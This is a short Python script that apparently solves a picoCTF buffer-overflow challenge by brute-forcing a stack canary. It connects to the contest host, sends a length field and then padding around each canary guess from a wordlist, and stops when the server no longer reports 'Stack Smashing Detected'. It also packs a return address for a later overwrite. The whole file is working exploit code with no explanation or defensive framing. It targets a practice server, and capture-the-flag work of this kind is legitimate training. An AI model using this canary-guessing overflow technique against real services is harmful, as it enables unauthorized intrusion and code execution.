#!/usr/bin/env python

import sys, socket, struct
from time import sleep

buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
buffer2 = "QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
ret = struct.pack("I",0x08049336)
resp = ""

for word in open('wordlist.txt','r'):
    # Create payload
    word = word.strip()
    payload = "%s%s%s\r\n" % (buffer,word,buffer2) 
    payload = bytes(payload,'utf-8')

    print(f"Sending: {payload}")
    #sleep(2)

    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("saturn.picoctf.net",61060)) # May change depending on instance
        s.recv(64)
        s.send((b"104\r\n"))
        s.recv(64)
        s.send((payload))
        resp = s.recv(64)
        resp = resp.decode('utf-8').strip()
        print(f"{resp}\n")

        if (resp != "***** Stack Smashing Detected ***** : Canary Value Corrupt!"): 
            break

        s.close()
    except:
        print(f"Error: Could not send {payload}")
        exit(-1)

print(f"Found Canary: {word}")